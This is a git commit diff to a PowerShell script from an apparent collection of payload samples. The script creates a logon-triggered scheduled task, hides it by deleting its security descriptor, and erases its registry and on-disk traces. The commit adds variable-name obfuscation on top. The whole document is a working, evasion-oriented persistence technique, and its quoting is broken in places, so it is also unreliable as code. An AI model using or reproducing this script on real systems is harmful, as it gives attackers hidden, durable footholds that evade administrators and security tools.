3acd758885474718dae47b195a57fab65fcdbd76
Calvin <74103103+Calvindd2f@users.noreply.github.com>
2023-03-01 05:42:04 +0000

    Update Hschtaskpersist.ps1

--- Payload Samples/Hschtaskpersist.ps1
+++ Payload Samples/Hschtaskpersist.ps1
@@ -4,30 +4,34 @@
 # Author: Calvindd2f
 # Reference: That malware gang
 
-$create_task = cmd.exe /c 'schtasks /create /tn HideItForever /tr 'C:\Windows\System32\calc.exe" /sc onlogon /ru calvin"
+${t\cache\\tree'} = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\HideItForever'
+${\q`\_`\task} = 'schtasks /query /fo LIST /tn HideItForever'
+${\c} = '/c'
+
+$create_task = cmd.exe ${\c} 'schtasks /create /tn HideItForever /tr 'C:\Windows\System32\calc.exe" /sc onlogon /ru c"
 if( $? ) 
 {
   Write-Output -InputObject '	[+] Scheduling HideItForever Task!'
   Write-Output -InputObject '	[+] Querying Task Scheduler ( Can also be verified from the Task Scheduler GUI)'
-  $query_task = cmd.exe /c 'schtasks /query /fo LIST /tn HideItForever'
+  $query_task = cmd.exe ${\c} ${\q`\_`\task}
   if( $? ) 
   {
     Write-Output -InputObject '	[+] HideItForever Task is been scheduled successfully!'
     $query_task
     Write-Output -InputObject '	[+] Hiding the HideItForever Task!'
-    $hide = Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\HideItForever' | Remove-ItemProperty -Name SD
+    $hide = Get-Item -Path ${t\cache\\tree'} | Remove-ItemProperty -Name SD
     if ( $? )
     {
       Write-Output -InputObject '	[+] HideItForever Task Hidden!'
       Write-Output -InputObject '	[+] Removing all on-disk Artifacts!'
-      $Id_value = Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\HideItForever' -Name 'Id'
+      $Id_value = Get-ItemPropertyValue -Path ${t\cache\\tree'} -Name 'Id'
       $regfinal = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\' + $Id_value
-      Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\HideItForever' -Force
+      Remove-Item -Path ${t\cache\\tree'} -Force
       Remove-Item -Path $regfinal -Force
       Remove-Item -Path "$env:windir\System32\Tasks\HideItForever"  -Force
       Write-Output -InputObject '	[+] The Scheduled Task is now Completely Hidden :) - Go check it out manually!'
       Write-Output -InputObject '	[+] Querying it using Schtasks!'
-      cmd.exe /c 'schtasks /query /fo LIST /tn HideItForever'
+      cmd.exe ${\c} ${\q`\_`\task}
     }
   }
 }
